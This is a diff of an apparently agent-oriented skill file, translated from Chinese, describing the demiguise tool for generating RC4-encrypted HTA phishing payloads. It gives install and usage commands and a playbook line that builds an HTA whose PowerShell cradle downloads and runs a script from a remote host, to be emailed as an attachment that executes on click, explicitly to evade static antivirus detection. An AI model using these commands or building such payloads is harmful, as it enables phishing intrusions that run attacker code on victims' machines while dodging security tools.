@@ -2,38 +2,41 @@
 name: demiguise-hta-crypt
 description: "demiguise: HTA phishing payload. Signals: malware development, evasion development, generate encrypted HTA, RC4 key."
 zh-signals: "demiguise: HTA 钓鱼载荷。信号:恶意软件开发,免杀开发,生成加密 HTA,RC4 密钥。"
+when-to-use: >-
+  Use when developing phishing payloads and you need to generate an encrypted HTA
+  file that embeds a PowerShell command with an RC4 key to evade static detection.
 ---
 
 # demiguise
 
-- 攻击大类:C45 免杀与载荷投递
-- 上游仓库:https://github.com/nccgroup/demiguise
-- 上游 License:AGPL-3.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)
+- Attack Category: C45 AV Evasion and Payload Delivery
+- Upstream Repository: https://github.com/nccgroup/demiguise
+- Upstream License: AGPL-3.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)
 
-## 安装
+## Installation
 
 ```bash
 git clone https://github.com/nccgroup/demiguise && pip install -r requirements.txt
 ```
 
-## 参数速查
+## Parameter Quick Reference
 
-| 参数 / 命令 | 说明 |
+| Parameter / Command | Description |
 | --- | --- |
-| `python demiguise.py -k key -c 'cmd /c whoami' -o out.hta` | 生成加密 HTA |
-| `-c payload.ps1` | PowerShell 载荷 |
-| `-k mykey` | RC4 密钥 |
-| `-o out.hta` | 输出 |
+| `python demiguise.py -k key -c 'cmd /c whoami' -o out.hta` | Generate encrypted HTA |
+| `-c payload.ps1` | PowerShell payload |
+| `-k mykey` | RC4 key |
+| `-o out.hta` | Output |
 
-## 攻击场景 Playbook
+## Attack Scenario Playbook
 
-### HTA 钓鱼载荷
+### HTA phishing payload
 
 ```bash
 python demiguise.py -k secret -c 'IEX (New-Object Net.WebClient).DownloadString("http://10.0.0.5/x.ps1")' -o doc.hta
-# 邮件附件 .hta,点击执行加密载荷
+# Email it as an .hta attachment; the encrypted payload runs on click
 ```
 
-## 注意事项
+## Notes
 
-NCC 出品,HTA 载荷加密工具,RC4 加密+嵌入 HTML,静态查杀难检出。
+By NCC; an HTA payload encryption tool that applies RC4 encryption plus embedded HTML, making it hard to catch with static scanning.
